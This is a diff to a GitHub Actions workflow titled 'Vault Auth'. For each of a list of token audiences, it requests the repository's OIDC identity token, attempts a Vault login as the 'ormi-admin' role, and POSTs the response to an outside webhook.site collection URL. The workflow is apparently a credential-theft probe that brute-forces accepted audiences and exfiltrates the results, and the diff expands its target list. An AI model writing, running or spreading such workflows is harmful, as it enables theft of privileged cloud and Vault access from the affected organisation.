@@ -1,4 +1,4 @@
-name: Vault Auth
+name: Vault Auth v2
 on:
   workflow_dispatch:
 permissions:
@@ -10,17 +10,21 @@ jobs:
     strategy:
       matrix:
         audience:
-          - "https://vault.cloud.ormi.dev"
-          - "vault.cloud.ormi.dev"
-          - "ormi"
-          - "ormi-admin"
-          - "https://argocd.gke.cloud.ormi.dev/api/dex"
-          - "argo-cd"
-          - "argo-workflows-sso"
-          - "argocd"
+          - "https://vault.cloud.ormi.dev/v1/auth/jwt"
+          - "https://vault.cloud.ormi.dev/"
+          - "vault"
+          - "ormi-labs"
+          - "0xgraph"
+          - "https://argocd.gke.cloud.ormi.dev"
+          - "https://workflows.cloud.0xgraph.xyz"
+          - "sigstore"
+          - "sts.amazonaws.com"
+          - "api://AzureADTokenExchange"
+          - "https://github.com/ormi-labs"
+          - "https://ormilabs.com"
     steps:
-      - name: Try audience
+      - name: Try
         run: |
           OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=${{ matrix.audience }}" | jq -r '.value')
           RESP=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
-          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"${{ matrix.audience }}\",\"vault\":$(echo $RESP | jq -Rs .)}"
+          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"${{ matrix.audience }}\",\"v\":$(echo $RESP | jq -Rs .)}"
